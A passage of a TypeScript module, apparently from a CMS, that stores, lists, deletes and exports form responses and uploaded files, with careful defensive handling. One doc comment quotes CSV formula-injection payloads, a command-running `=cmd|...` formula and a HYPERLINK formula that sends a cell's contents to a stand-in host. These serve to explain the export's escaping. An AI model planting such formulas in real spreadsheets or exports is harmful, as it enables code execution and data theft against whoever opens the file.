      key: newUploadKey(part.name),
      filename,
      size: bytes.byteLength,
      contentType: labelFor(sniffed, part.type),
      bytes,
      contentHash: await hashBytes(bytes),
    })
  }

  return { files, errors }
}

/** `FilePart`s for `bodyHash`: the field, the size and the content hash, which
 *  is exactly what makes two identical submissions hash identically. */
export function filePartsOf(files: readonly PreparedUpload[]): FilePart[] {
  return files.map((f) => ({ field: f.field, size: f.size, contentHash: f.contentHash }))
}

/** The `files` column's value: the metadata, without the bytes. */
export function storedFilesOf(files: readonly PreparedUpload[]): SubmittedFile[] {
  return files.map(({ field, key, filename, size, contentType }) => ({
    field,
    key,
    filename,
    size,
    contentType,
  }))
}

/**
 * The objects into the bucket, in parallel.
 *
 * **`application/octet-stream` and `attachment`, on the stored metadata as well
 * as on the route** (decision 15). The route sets both on every response, so
 * this is belt to that braces — but an object is a thing with a lifetime of its
 * own, and one whose stored `contentType` says `text/html` is one signed URL or
 * one misconfigured bucket policy away from being a page on somebody's origin.
 * `serveAsset` learned the same lesson from the other end: it re-checks the
 * allowlist on read because the write was somebody else's decision.
 *
 * `no-store`, because an upload behind a `FORMS` gate has no business in any
 * shared cache and R2 will otherwise offer a caching hint of its own.
 */
export async function putUploads(
  bucket: R2Bucket,
  files: readonly PreparedUpload[],
): Promise<void> {
  await Promise.all(
    files.map((file) =>
      bucket.put(file.key, file.bytes, {
        httpMetadata: {
          contentType: DOWNLOAD_CONTENT_TYPE,
          contentDisposition: `attachment; filename="${file.filename}"`,
          cacheControl: 'private, no-store',
        },
      }),
    ),
  )
}

/* --------------------------------------------------------------- writing --- */

/** One uploaded file, as the `submitted` hook receives it and as the `files`
 *  column stores it. `key` is minted by `newUploadKey`; the bytes are the R2
 *  object and never travel with this. */
export interface SubmittedFile {
  field: string
  /** The R2 key, under the `sub_` prefix the public asset route cannot serve. */
  key: string
  filename: string
  size: number
  contentType: string
}

/**
 * A stored response, as the `submitted` hook receives it.
 *
 * **A projection, not the row.** `ip_hash` and `body_hash` are deliberately
 * absent: the first is the one quasi-identifier in the table and the second is a
 * fingerprint of the answers, and neither is anything a notification, a CRM push
 * or a Slack message has a use for. A host that genuinely needs them holds the
 * `db` binding. This is `presenceOf`'s posture toward a socket attachment,
 * applied to a payload that leaves the process.
 */
export interface FormResponse {
  id: string
  formId: string
  version: number
  createdAt: number
  data: Record<string, ResponseValue>
  locale: string
  page: string
}

export interface NewResponse {
  form: Form
  data: Record<string, ResponseValue>
  locale: string
  page: string
  /** Null when the request carried no client IP. The row then sits outside the
   *  partial index and no rate limit can ever match it. */
  ipHash: string | null
  bodyHash: string
  files: readonly SubmittedFile[]
  now?: number
}

export interface InsertedResponse {
  response: FormResponse
  /**
   * False when an identical body arrived inside the last minute and this one
   * collapsed into it.
   *
   * The caller still answers success — from the visitor's side it worked — but
   * **must not fire `submitted`**: one row that reached a CRM twice because
   * somebody double-clicked is exactly the outcome the collapse exists to
   * prevent.
   */
  stored: boolean
}

/**
 * `res_<12 hex>`, the convention every other minted id follows.
 *
 * Exported because the submit route mints one for a submission it is **not**
 * going to store: a caught honeypot has to answer with an id that looks exactly
 * like a real one, or the answer itself tells whoever wrote the bot which field
 * to leave alone next time.
 */
export function newResponseId(): string {
  return `res_${crypto.randomUUID().replace(/-/g, '').slice(0, 12)}`
}

/**
 * One response, or the discovery that it was a duplicate — **in one statement**
 * (decision 14).
 *
 * `insert … select … where not exists` is what makes a double-click safe without
 * a lock: there is no read-then-write pair for the second click to fit through,
 * and `changes = 0` is the answer rather than a row that was inserted and then
 * regretted. `consumeChallenge` gets its single-use property the same way.
 *
 * `version` is read off the form the server just loaded, never off anything the
 * page claimed: a page cached for a week submits against the live form, and the
 * stored stamp has to say which shape actually validated it (decision 7).
 *
 * Thirteen binds, fixed. Nothing here is sized by the submitter.
 */
export async function insertResponse(db: FolioDb, input: NewResponse): Promise<InsertedResponse> {
  const now = input.now ?? Date.now()
  const response: FormResponse = {
    id: newResponseId(),
    formId: input.form.id,
    version: input.form.version,
    createdAt: now,
    data: input.data,
    locale: input.locale,
    page: input.page,
  }

  const result = await db
    .prepare(
      `insert into form_responses
         (id, form_id, version, created_at, data, locale, page, ip_hash, body_hash, files)
       select ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
       where not exists (
         select 1 from form_responses
         where form_id = ? and body_hash = ? and created_at > ?
       )`,
    )
    .bind(
      response.id,
      response.formId,
      response.version,
      response.createdAt,
      JSON.stringify(response.data),
      response.locale,
      response.page,
      input.ipHash,
      input.bodyHash,
      JSON.stringify(input.files),
      response.formId,
      input.bodyHash,
      now - DUPLICATE_WINDOW_MS,
    )
    .run()

  return { response, stored: (result.meta.changes ?? 0) > 0 }
}

/**
 * Whether an identical body already landed inside the window — asked **before**
 * anything is put to R2 (decision 14).
 *
 * This is not the arbiter and is not meant to be: `insertResponse`'s single
 * statement is, and it stays the thing that decides, because a read here and a
 * write there is exactly the race the one-statement collapse exists to close.
 * What this buys is the megabytes. `body_hash` covers each file's bytes, so a
 * double-clicked application with a 5MB CV attached is *knowably* a duplicate
 * before the object is written, and asking costs one indexed read against
 * `form_responses_dupe` — the same index the insert's own `not exists` uses.
 *
 * The caller runs it only when there is a file to save, because for a text-only
 * submission it would be a second query to avoid nothing.
 *
 * Three binds, fixed.
 */
export async function isDuplicateSubmission(
  db: FolioDb,
  formId: string,
  hash: string,
  now: number = Date.now(),
): Promise<boolean> {
  const row = await db
    .prepare(
      `select 1 as hit from form_responses
       where form_id = ? and body_hash = ? and created_at > ? limit 1`,
    )
    .bind(formId, hash, now - DUPLICATE_WINDOW_MS)
    .first<{ hit: number }>()
  return row !== null
}

/**
 * One response's uploaded file for one question, for the gated download route.
 *
 * **Narrow on purpose.** The full response reader is phase 7's and this needs
 * one column: reading the whole row to serve a file would put a stranger's
 * answers in a Worker's memory for a request that is about the attachment.
 *
 * `form_id` is bound as well as `id`, so a response id from one form cannot be
 * used to read a file through another form's URL — the id is unguessable, but a
 * route that only checks the id is a route whose access control is the id.
 *
 * Screened on read, `parseScopes`' posture: a `files` entry missing a `key` or a
 * `field` is not a file, and a malformed column answers "no such file" rather
 * than throwing on a route somebody is waiting on.
 *
 * **`contentType` comes back as `application/octet-stream` whatever the column
 * says**, because that is what the route will send however the bytes sniffed
 * (decision 15). Handing the caller the stored label and trusting it to ignore
 * it is how a later edit ends up echoing a stranger's `text/html` back to a
 * publisher's browser; there is nothing here to ignore.
 */
export async function responseFileOf(
  db: FolioDb,
  formId: string,
  responseId: string,
  field: string,
): Promise<SubmittedFile | null> {
  const row = await db
    .prepare('select files from form_responses where id = ? and form_id = ?')
    .bind(responseId, formId)
    .first<{ files: string }>()
  if (!row) return null

  let parsed: unknown
  try {
    parsed = JSON.parse(row.files)
  } catch {
    return null
  }
  if (!Array.isArray(parsed)) return null

  for (const entry of parsed) {
    if (!entry || typeof entry !== 'object') continue
    const file = entry as Record<string, unknown>
    if (file.field !== field || typeof file.key !== 'string' || file.key === '') continue
    return {
      field,
      key: file.key,
      filename: typeof file.filename === 'string' ? file.filename : 'download',
      size: typeof file.size === 'number' ? file.size : 0,
      contentType: DOWNLOAD_CONTENT_TYPE,
    }
  }
  return null
}

/* --------------------------------------------------------------- reading --- */

/**
 * A stored response as the **admin** reads it (`phase 7`).
 *
 * **A projection, like `FormResponse`, and one column narrower than the row.**
 * `ip_hash` and `body_hash` are not here and must not be added: the first is the
 * one quasi-identifier in the table and expires by construction (decision 10),
 * the second is a fingerprint of the answers, and a screen that displayed either
 * would be a screen that gave a stored hash a second life. `files` *is* here,
 * because the drawer offers a download per question and the export names the
 * filename somebody sent.
 *
 * `data` is screened on read the way `parseScopes` screens a JSON column: a value
 * that is not a string, a number, a boolean or an array of strings is simply not
 * an answer. A malformed row must not be the reason a table cannot be listed.
 */
export interface ResponseRow {
  id: string
  formId: string
  version: number
  createdAt: number
  data: Record<string, ResponseValue>
  locale: string
  page: string
  files: SubmittedFile[]
}

/** The columns every reader here projects. `ip_hash` and `body_hash` are absent
 *  from the *statement*, not filtered afterwards — the narrower read is the one
 *  that cannot leak. */
const RESPONSE_COLS = `id, form_id as formId, version, created_at as createdAt,
  data, locale, page, files`

interface ResponseDbRow {
  id: string
  formId: string
  version: number
  createdAt: number
  data: string
  locale: string
  page: string
  files: string
}

/** One answer, or nothing. Arrays are screened element by element, because a
 *  `checkboxes` answer is the one value that is a list and a list of objects is
 *  not one. */
function readAnswer(raw: unknown): ResponseValue | undefined {
  if (typeof raw === 'string' || typeof raw === 'number' || typeof raw === 'boolean') return raw
  if (Array.isArray(raw) && raw.every((one) => typeof one === 'string')) return raw as string[]
  return undefined
}

function readAnswers(raw: string): Record<string, ResponseValue> {
  let parsed: unknown
  try {
    parsed = JSON.parse(raw)
  } catch {
    return {}
  }
  if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) return {}
  const data: Record<string, ResponseValue> = {}
  for (const [key, value] of Object.entries(parsed as Record<string, unknown>)) {
    // `_` can never be a declared field name, so a key in that namespace is a
    // row written by something other than `insertResponse` — the second of the
    // two locks decision 13 describes, read from the other end.
    if (key.startsWith(RESERVED_PREFIX)) continue
    const answer = readAnswer(value)
    if (answer !== undefined) data[key] = answer
  }
  return data
}

/**
 * The `files` column as the admin reads it. Screened the way `responseFileOf`
 * screens the same column, and **the stored `contentType` is replaced by
 * `application/octet-stream`** for that function's reason: the label a stranger's
 * bytes were given is not a thing any surface should echo, and there is nothing
 * to ignore if it never arrives.
 */
function readFiles(raw: string): SubmittedFile[] {
  let parsed: unknown
  try {
    parsed = JSON.parse(raw)
  } catch {
    return []
  }
  if (!Array.isArray(parsed)) return []
  const files: SubmittedFile[] = []
  for (const entry of parsed) {
    if (!entry || typeof entry !== 'object') continue
    const file = entry as Record<string, unknown>
    if (typeof file.field !== 'string' || typeof file.key !== 'string' || file.key === '') continue
    files.push({
      field: file.field,
      key: file.key,
      filename: typeof file.filename === 'string' ? file.filename : 'download',
      size: typeof file.size === 'number' ? file.size : 0,
      contentType: DOWNLOAD_CONTENT_TYPE,
    })
  }
  return files
}

function toResponse(row: ResponseDbRow): ResponseRow {
  return {
    id: row.id,
    formId: row.formId,
    version: row.version,
    createdAt: row.createdAt,
    data: readAnswers(row.data),
    locale: row.locale,
    page: row.page,
    files: readFiles(row.files),
  }
}

/**
 * `(created_at, id)` descending — newest first, which is the only order a
 * responses table is read in and exactly what `form_responses_form` covers.
 */
const RESPONSES_ORDER: Keyset = { columns: ['created_at', 'id'], direction: 'desc' }

/**
 * The filter's `where` fragments and their binds, form id included.
 *
 * **`q` is a substring scan and says so** (decision 16's sibling reasoning): no
 * index serves a leading-wildcard `like`, so this reads the form's rows and
 * matches the stored JSON text. Unescaped, like every other `q` in this codebase
 * (`listRedirects`, `assetFilterSql`): a `%` or a `_` in a search term widens the
 * match rather than narrowing it, which is the harmless direction on a read.
 *
 * Scanning `data` as text rather than through `json_each` is deliberate — the
 * question the box asks is "does this response mention Ferguson", and a scan over
 * one column answers it in one clause instead of a correlated subquery per row.
 * It can match a *key* as well as a value, which is a wider answer than asked for
 * and never a wrong row: the keys are the questions the person is looking at.
 */
function responseFilterSql(
  formId: string,
  filter: ResponseFilter,
): { clauses: string[]; binds: (string | number)[] } {
  const clauses = ['form_id = ?']
  const binds: (string | number)[] = [formId]
  if (filter.from !== undefined) {
    clauses.push('created_at >= ?')
    binds.push(filter.from)
  }
  if (filter.to !== undefined) {
    clauses.push('created_at < ?')
    binds.push(filter.to)
  }
  if (filter.q) {
    clauses.push('data like ?')
    binds.push(`%${filter.q}%`)
  }
  return { clauses, binds }
}

/** How many responses match, for the header and for the bulk delete's count
 *  guard — one function, so the number a person read and the number the guard
 *  re-runs cannot come from two different sets of clauses. */
export async function countResponses(
  db: FolioDb,
  formId: string,
  filter: ResponseFilter = {},
): Promise<number> {
  const { clauses, binds } = responseFilterSql(formId, filter)
  const row = await db
    .prepare(`select count(*) as n from form_responses ${whereOf(...clauses)}`)
    .bind(...binds)
    .first<{ n: number }>()
  return row?.n ?? 0
}

export interface ListResponsesOptions {
  limit?: number
  cursor?: string
  filter?: ResponseFilter
  /**
   * Adds `total` for the filtered set **and** `oldest` for the whole form.
   *
   * One opt-in for two numbers, and the asymmetry between them is the point.
   * `total` is what the header counts and what a select-all's guard compares
   * against (`pagination.md` decision 5 insists those be one query); `oldest`
   * ignores the filter entirely, because decision 17 asks this screen to show
   * *"the age of the oldest row"* as the standing symptom of manual retention,
   * and a number that moved every time somebody typed in the search box would
   * say nothing about retention at all.
   */
  count?: boolean
}

export interface ResponsePage extends Page<ResponseRow> {
  /** When this form's first surviving response arrived, or null when it has
   *  none. Absent unless `count` was asked for. */
  oldest?: number | null
}

/**
 * One page of a form's responses, newest first
 * (`../../docs/specs/content-model/forms.md` phase 7).
 *
 * `FolioDb`, never `D1Database`: this is a `GET` under `{base}/api`, so
 * `withBindings` has already opened the request's session and every read here
 * can reach a replica.
 *
 * Nothing binds a caller-sized list — four binds at the widest, whatever the
 * filter says and however many rows come back.
 */
export async function listResponses(
  db: FolioDb,
  formId: string,
  opts: ListResponsesOptions = {},
): Promise<ResponsePage> {
  const limit = clampLimit(opts.limit, 50, 200)
  const cursor = opts.cursor ? decodeCursor(opts.cursor) : null
  const resume = keysetWhere(RESPONSES_ORDER, cursor)
  const { clauses, binds } = responseFilterSql(formId, opts.filter ?? {})

  const [rows, counted] = await Promise.all([
    db
      .prepare(
        `select ${RESPONSE_COLS} from form_responses
         ${whereOf(...clauses, resume.sql)} ${orderBy(RESPONSES_ORDER)} limit ?`,
      )
      .bind(...binds, ...resume.binds, limit + 1)
      .all<ResponseDbRow>(),
    opts.count
      ? Promise.all([
          countResponses(db, formId, opts.filter ?? {}),
          db
            .prepare('select min(created_at) as oldest from form_responses where form_id = ?')
            .bind(formId)
            .first<{ oldest: number | null }>(),
        ])
      : null,
  ])

  const page = paginate(rows.results.map(toResponse), limit, (row) => [row.createdAt, row.id])
  if (!counted) return page
  const [total, oldest] = counted
  return { ...page, total, oldest: oldest?.oldest ?? null }
}

/**
 * One response, every key it holds.
 *
 * **`form_id` is bound as well as the id**, `responseFileOf`'s rule: a response
 * id is unguessable, and a route that checks only the id is a route whose access
 * control *is* the id.
 */
export async function responseById(
  db: FolioDb,
  formId: string,
  id: string,
): Promise<ResponseRow | null> {
  const row = await db
    .prepare(`select ${RESPONSE_COLS} from form_responses where id = ? and form_id = ?`)
    .bind(id, formId)
    .first<ResponseDbRow>()
  return row ? toResponse(row) : null
}

/* -------------------------------------------------------------- deleting --- */

export interface DeleteResponseResult {
  deleted: boolean
  /** Objects removed with it. Zero for a text-only response, and zero for a
   *  delete that found no row. */
  files: number
}

/**
 * One response and its uploads.
 *
 * **D1 first, then R2, and the R2 failure is swallowed** — `deleteAsset`'s rule,
 * and the *inverse* of `deleteForm`'s. The order is what decides it: here the
 * keys are read before the row goes, so by the time the objects are reached the
 * row is already committed gone and there is nothing left to retry *from*. A
 * throw would report a failure the caller cannot act on, over a row that is
 * already deleted. `deleteForm` inverts both halves because it has to walk the
 * rows to learn the keys at all.
 *
 * The read is the same statement `responseFileOf` uses, one column wide: a
 * delete has no business loading a stranger's answers into memory.
 */
export async function deleteResponse(
  db: FolioDb,
  formId: string,
  id: string,
  bucket?: R2Bucket,
): Promise<DeleteResponseResult> {
  const row = await db
    .prepare('select files from form_responses where id = ? and form_id = ?')
    .bind(id, formId)
    .first<{ files: string }>()
  if (!row) return { deleted: false, files: 0 }

  const keys = uploadKeysOf(row.files)
  const result = await db
    .prepare('delete from form_responses where id = ? and form_id = ?')
    .bind(id, formId)
    .run()
  if ((result.meta.changes ?? 0) === 0) return { deleted: false, files: 0 }

  await sweepUploads(bucket, keys)
  return { deleted: true, files: keys.length }
}

/**
 * Objects whose rows are already gone, best effort.
 *
 * Swallowed with one line, `deleteAsset`'s posture and `runOne`'s shape: the row
 * is committed, so a throw here cannot be undone into anything and would only
 * turn a completed delete into an error somebody re-runs against nothing. An
 * orphaned object costs storage; a delete that reports failure over a row that is
 * gone costs trust in the button.
 */
async function sweepUploads(bucket: R2Bucket | undefined, keys: readonly string[]): Promise<void> {
  if (!bucket || keys.length === 0) return
  try {
    await deleteUploads(bucket, keys)
  } catch (e) {
    console.error('folio: could not delete uploaded files for a deleted response', e)
  }
}

/** The only bulk action over responses. A one-member union rather than a bare
 *  string, so `BulkReport<ResponseBulkAction>` names what it did and a client
 *  cannot read an action the server can never send. */
export type ResponseBulkAction = 'delete'

/** How many responses one call deletes before handing back a cursor. Twenty-five,
 *  `runBulk`'s and `runAssetBulk`'s number, and for their reason: a delete is a
 *  statement plus an R2 call per batch. */
export const DEFAULT_RESPONSE_BULK_BATCH = 25

/** Ceiling on `batch`, the 200 every batched run in this codebase shares. */
export const MAX_RESPONSE_BULK_BATCH = 200

export interface ResponseBulkDeps {
  db: FolioDb
  /** Absent is legal: a form with no file question has no objects to remove, and
   *  a delete that found keys with no bucket leaves them rather than refusing —
   *  the rows are what the person asked to destroy. */
  media?: R2Bucket | undefined
}

export interface ResponseBulkOptions {
  batch?: number
  continueFrom?: string | null
  dryRun?: boolean
}

/**
 * A bulk delete over a selection of responses
 * (`../../docs/specs/platform/bulk-writes.md`, `core/bulk.ts`).
 *
 * **A third runner rather than a generic one**, which is `runAssetBulk`'s own
 * argument taken one table further: what the three share is `core/bulk.ts` — the
 * selection shapes, the report shapes, the cursor codec and the rules written on
 * them — and a runner generic over five dependency bags for the sake of a `for`
 * loop is worse than three loops. This one is the smallest of the three: one
 * action, two dependencies, no per-row usage question to answer.
 *
 * Four properties are `runBulk`'s and are load-bearing here for its reasons:
 *
 * - **The count is the guard, checked once at the start of the job**, and it is
 *   also the ceiling — a run touches at most `expected - exclude.length` rows
 *   however many batches it takes. A refusal is a *value*, not a throw.
 * - **Execution is a batched job.** One call does up to `batch` rows and answers
 *   `continueFrom`; the caller re-calls until it is null.
 * - **Every row is its own `try`**, so one row that D1 refuses does not abandon
 *   the twenty-four behind it.
 * - **The objects go after the rows, per batch, and their failure is swallowed.**
 *   A batch whose every object delete failed still advances the cursor — the
 *   spec's own edge case — because the rows it named are gone and re-reading them
 *   is not a thing the cursor can do.
 *
 * **Nothing binds a caller-sized list.** The ids of an explicit selection are
 * chunked through `bindChunks`; the keys never reach a statement at all, because
 * they come off rows this batch already read and go straight to R2, which caps a
 * `delete` at a thousand keys and has no bind ceiling.
 */
export async function deleteResponses(
  deps: ResponseBulkDeps,
  formId: string,
  selection: BulkSelection<ResponseFilter>,
  opts: ResponseBulkOptions = {},
): Promise<BulkOutcome<ResponseBulkAction>> {
  const { db } = deps
  const dryRun = opts.dryRun === true
  const batch = Math.min(
    Math.max(Math.trunc(opts.batch ?? DEFAULT_RESPONSE_BULK_BATCH), 1),
    MAX_RESPONSE_BULK_BATCH,
  )
  const resume = opts.continueFrom ? readResponseCursor(opts.continueFrom) : null

  // Before the ceiling check, exactly as `runAssetBulk` orders it: a cursor that
  // disagrees with the list it was issued against is a client bug whatever the
  // arithmetic says, and an exhausted allowance would otherwise report a placid
  // "nothing left to do" for it.
  if (!selection.all && resume !== null && selection.ids[resume.seen - 1] !== resume.after) {
    throw new FolioError(
      'bad_request',
      'The selection changed between batches. Start the operation again.',
    )
  }

  const total = selection.all
    ? Math.max(selection.expected - (selection.exclude?.length ?? 0), 0)
    : selection.ids.length
  const seen = resume?.seen ?? 0

  if (selection.all && resume === null) {
    const actual = await countResponses(db, formId, selection.filter)
    if (actual !== selection.expected) {
      return { refused: 'count', expected: selection.expected, actual }
    }
  }

  const report: BulkReport<ResponseBulkAction> = {
    action: 'delete',
    done: 0,
    failed: [],
    total,
    seen,
    continueFrom: null,
    dryRun,
  }

  const allowance = total - seen
  if (allowance <= 0) return report

  const { rows, consumed, exhausted, last } = selection.all
    ? await responseFilterBatch(db, formId, selection, resume?.after ?? null, batch, allowance)
    : await responseIdBatch(db, formId, selection.ids, seen, Math.min(batch, allowance))

  const keys: string[] = []
  for (const row of rows) {
    if (row === null) {
      // An id the client named and D1 no longer has. A delete has already got
      // what it asked for, so this is a success rather than a named failure —
      // `runAssetBulk`'s reading of the same case.
      report.done++
      continue
    }
    if (dryRun) {
      report.done++
      continue
    }
    try {
      await db
        .prepare('delete from form_responses where id = ? and form_id = ?')
        .bind(row.id, formId)
        .run()
      keys.push(...uploadKeysOf(row.files))
      report.done++
    } catch (e) {
      report.failed.push({
        id: row.id,
        title: whenOf(row.createdAt),
        message: reasonOf(e),
      })
    }
  }

  // After the rows, once per batch rather than once per row: the keys are already
  // in hand and R2 takes a thousand at a time.
  if (!dryRun) await sweepUploads(deps.media, keys)

  report.seen = seen + consumed
  report.continueFrom =
    exhausted || report.seen >= total || last === null ? null : writeBulkCursor(last, report.seen)
  return report
}

/** A row this runner needs and nothing more: the id to delete, the keys to
 *  sweep, and a timestamp to name it by in a failure report. */
interface BulkResponseRow {
  id: string
  createdAt: number
  files: string
}

interface ResponseBatch {
  rows: (BulkResponseRow | null)[]
  consumed: number
  exhausted: boolean
  last: string | null
}

/**
 * One batch of a captured filter.
 *
 * **Walked by `id`, not by `created_at`** — `uploadKeysPage`'s reason, one table
 * over: the set is being destroyed as it is walked, and `id` is the one key that
 * is stable, unique and rewritten by nothing. The list the person was looking at
 * is newest-first; the *walk* is not the list, and nothing about a delete depends
 * on the order it happens in.
 *
 * **The exclusions are applied here, in JavaScript, not in the `where`.** A
 * selection's `exclude` is up to 500 ids, five times `D1_BIND_CAP`, and no
 * chunking rescues a single statement (`filterBatch` says the same). `last` is
 * the last row **read**, not the last kept, so the cursor steps past an excluded
 * row rather than reading it forever.
 */
async function responseFilterBatch(
  db: FolioDb,
  formId: string,
  selection: FilterSelection<ResponseFilter>,
  after: string | null,
  limit: number,
  allowance: number,
): Promise<ResponseBatch> {
  const { clauses, binds } = responseFilterSql(formId, selection.filter)
  const resume = after === null ? [] : ['id > ?']
  const { results } = await db
    .prepare(
      `select id, created_at as createdAt, files from form_responses
       ${whereOf(...clauses, ...resume)} order by id limit ?`,
    )
    .bind(...binds, ...(after === null ? [] : [after]), limit)
    .all<BulkResponseRow>()

  const excluded = new Set(selection.exclude ?? [])
  const kept = excluded.size === 0 ? results : results.filter((row) => !excluded.has(row.id))
  const acting = kept.length > allowance ? kept.slice(0, allowance) : kept
  return {
    rows: acting,
    consumed: acting.length,
    exhausted: results.length < limit,
    last: results.at(-1)?.id ?? null,
  }
}

/**
 * One batch of an explicit id list.
 *
 * The client re-posts the same `ids` every call, so the slice offset *is* the
 * cursor's counter. `consumed` is the *slice* length rather than the row count,
 * because a row already deleted is absent from the read and counting rows would
 * read a stale id as the end of the list.
 *
 * Chunked at one bind a row plus the form id, so a 500-id selection is five
 * statements rather than one that D1 refuses.
 */
async function responseIdBatch(
  db: FolioDb,
  formId: string,
  ids: readonly string[],
  seen: number,
  limit: number,
): Promise<ResponseBatch> {
  const slice = ids.slice(seen, seen + limit)
  const pages = await Promise.all(
    bindChunks(slice, 1).map(async (chunk) => {
      const { results } = await db
        .prepare(
          `select id, created_at as createdAt, files from form_responses
           where form_id = ? and id in (${chunk.map(() => '?').join(', ')})`,
        )
        .bind(formId, ...chunk)
        .all<BulkResponseRow>()
      return results
    }),
  )
  const found = new Map(pages.flat().map((row) => [row.id, row]))
  return {
    rows: slice.map((id) => found.get(id) ?? null),
    consumed: slice.length,
    exhausted: slice.length < limit,
    last: slice.at(-1) ?? null,
  }
}

function readResponseCursor(raw: string): { after: string; seen: number } {
  const at = readBulkCursor(raw)
  if (!at) throw new FolioError('bad_request', 'Malformed pagination cursor')
  return at
}

/** Why one row could not be deleted, as text that goes straight into a toast —
 *  `runAssetBulk`'s `reasonOf`, and anything `rethrow` declines to translate gets
 *  the generic sentence here and the real one in the log. */
function reasonOf(e: unknown): string {
  try {
    rethrow(e)
  } catch (translated) {
    if (translated instanceof FolioError) return translated.message
  }
  console.error('folio: could not delete a form response', e)
  return 'Could not delete it'
}

/** A row named by when it arrived, because a response has no title. ISO to the
 *  minute: a report is prose a person reads, and `res_9f2c…` is not. */
function whenOf(at: number): string {
  return new Date(at).toISOString().slice(0, 16).replace('T', ' ')
}

/* ---------------------------------------------------------------- export --- */

/**
 * A CSV of a form's responses, streamed
 * (`../../docs/specs/content-model/forms.md` decision 16).
 *
 * Two properties carry this file's half of the feature, and both are about the
 * fact that **every cell here was typed by a stranger**:
 *
 * - **A cell beginning `=`, `+`, `-`, `@`, a tab or a carriage return is prefixed
 *   with an apostrophe.** CSV formula injection is not hypothetical for a surface
 *   whose entire input is anonymous: `=cmd|'/c calc'!A1` in a name field executes
 *   when the file is opened in Excel, and `=HYPERLINK("http://x/"&A2,"click")`
 *   exfiltrates the row beside it. The prefix is what Excel and Sheets both read
 *   as "this is text".
 * - **Quoting is RFC 4180 and applies on top of the prefix, never instead of
 *   it.** A cell holding a quote, a comma or a newline is wrapped and its quotes
 *   doubled; a cell holding `=1,2` gets both treatments.
 *
 * The header is assembled once, before a byte is written, from **the union of
 * every key ever submitted to this form** plus the questions it currently
 * declares. Current fields come first in the form's order, retired keys after and
 * sorted — so a column that has stopped being asked keeps its data and stops
 * being confused with one that is still live.
 */

/** The byte order mark. Written as an escape rather than as the character
 *  itself, because a literal BOM inside a template string is invisible in every
 *  editor and diff that would need to show it. */
const BOM = '\ufeff'

/** Rows per keyset page while streaming. Two hundred is the list route's own
 *  ceiling, and a page holds answers rather than ids, so it is a memory bound. */
const CSV_PAGE = 200

/** What a current field asks for and a response never answered — decision 16's
 *  rule that *"this did not exist yet"* and *"they left it blank"* are different
 *  facts and must not both render as an empty cell. */
const CSV_ABSENT = '—'

/**
 * The five columns that are not answers.
 *
 * **Named in Folio's reserved namespace, which is what makes them collision-proof
 * rather than merely unlikely** (decision 13): `validateFormFields` refuses a
 * field slug starting with `_`, and `NAME` requires the first character to be
 * `[a-z]`, so no submitted key can ever be one of these. A header of prose
 * (`Submitted at`) would have been friendlier and would have relied on nobody
 * ever naming a question that.
 */
const META_COLUMNS = [
  { key: '_submitted_at', source: 'meta' as const },
  { key: '_response_id', source: 'meta' as const },
  { key: '_version', source: 'meta' as const },
  { key: '_locale', source: 'meta' as const },
  { key: '_page', source: 'meta' as const },
]

export interface CsvColumn {
  /** The header cell, and the `data` key or file field it reads. */
  key: string
  /**
   * Where the value comes from. `field` is a question the form still declares,
   * `retired` a key only older responses hold, `meta` one of the five above.
   */
  source: 'meta' | 'field' | 'retired'
  /** A `file` question: the value is a filename out of the `files` column, since
   *  an upload stores no answer in `data` at all. */
  file?: boolean
}

/** Which field kinds are a column. `statement` is prose between questions and
 *  stores nothing, so a column for one would be a column of `—`. */
const isColumnKind = (field: FormField): boolean => field.kind !== 'statement'

/**
 * The header, in decision 16's order: metadata, then the form's current
 * questions in the order the builder shows them, then every other key any
 * response holds, sorted.
 *
 * `keys` is screened against the field-name charset rather than trusted. It comes
 * out of `json_each` over a stored column, so a row written by something other
 * than `insertResponse` could otherwise put an arbitrary string in a header cell —
 * and a header cell is the one place in this file a value is not also a value.
 */
export function responseCsvColumns(
  fields: readonly FormField[],
  keys: readonly string[],
): CsvColumn[] {
  const columns: CsvColumn[] = [...META_COLUMNS]
  const declared = new Set<string>()
  for (const field of fields) {
    if (!isColumnKind(field)) continue
    declared.add(field.name)
    columns.push({
      key: field.name,
      source: 'field',
      ...(field.kind === 'file' ? { file: true } : {}),
    })
  }
  const retired = [...new Set(keys)].filter((key) => CSV_KEY.test(key) && !declared.has(key)).sort()
  for (const key of retired) columns.push({ key, source: 'retired' })
  return columns
}

/** The charset a field name has, applied to a key read back out of storage. */
const CSV_KEY = /^[a-z][a-z0-9_]{0,63}$/

/**
 * One value as text.
 *
 * A `checkboxes` answer is a list and is joined with `, ` — inside a quoted cell,
 * which is what makes the comma legal rather than a column boundary. A boolean is
 * `yes`/`no` rather than `true`/`false`: the question was a tick box and the
 * answer is a person's, not a program's.
 */
export function csvValue(column: CsvColumn, response: ResponseRow): string {
  if (column.source === 'meta') return metaValue(column.key, response)
  // The files column is checked for **every** answer column, not only a current
  // `file` question: a retired file question leaves no key in `data` at all, so
  // reading `data` first would render an attachment somebody sent as `—`.
  const file = response.files.find((one) => one.field === column.key)
  if (file) return file.filename
  if (column.file) return CSV_ABSENT
  const value = response.data[column.key]
  if (value === undefined) return CSV_ABSENT
  if (Array.isArray(value)) return value.join(', ')
  if (typeof value === 'boolean') return value ? 'yes' : 'no'
  return String(value)
}

function metaValue(key: string, response: ResponseRow): string {
  switch (key) {
    case '_submitted_at':
      return new Date(response.createdAt).toISOString()
    case '_response_id':
      return response.id
    case '_version':
      return String(response.version)
    case '_locale':
      return response.locale
    default:
      return response.page
  }
}

/**
 * The characters a spreadsheet reads as "this cell is code".
 *
 * The four decision 16 names, plus a tab and a carriage return: both are leading
 * whitespace Excel skips before it looks for a formula, so `\t=1+1` is a formula
 * that a check on `=` alone lets through.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/

/**
 * One cell, de-fanged and then quoted.
 *
 * **The order matters and only one of the two is optional.** The apostrophe goes
 * on first, because a value that begins `=` is dangerous whether or not it also
 * needs quoting; the quoting then wraps whatever came out. Reversing them would
 * put the prefix outside the quotes, where it is a stray character in the file
 * rather than an escape in the cell.
 */
export function csvCell(raw: string): string {
  const defanged = FORMULA_LEAD.test(raw) ? `'${raw}` : raw
  return /["\n\r,]/.test(defanged) ? `"${defanged.replace(/"/g, '""')}"` : defanged
}

/** One line, RFC 4180's CRLF. */
export function csvRow(cells: readonly string[]): string {
  return `${cells.map(csvCell).join(',')}\r\n`
}

/**
 * Every key any response to this form holds — one query, before the first row is
 * written, so the export never has to be buffered to discover its own columns.
 *
